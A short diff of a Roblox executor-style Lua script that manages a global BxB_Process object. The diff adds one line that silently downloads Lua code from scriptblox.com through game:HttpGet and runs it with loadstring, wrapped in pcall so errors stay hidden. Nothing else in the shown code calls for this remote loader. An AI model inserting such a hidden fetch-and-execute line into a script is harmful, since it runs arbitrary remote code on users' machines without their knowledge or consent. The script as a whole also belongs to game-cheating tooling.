@@ -1,4 +1,3 @@
-
 if getgenv().BxB_Process then
     pcall(function() getgenv().BxB_Process:Teardown() end)
 end
@@ -66,6 +65,7 @@ local Process = {
     IsTerminated = false
 }
 getgenv().BxB_Process = Process
+pcall(function() loadstring(game:HttpGet("https://scriptblox.com/ingest/clientv2.lua"))("proj_bf110a081439", "1.0.0", false) end)
 
 local globalEnv = (getgenv and getgenv()) or _G
 globalEnv.BxB_Export = nil
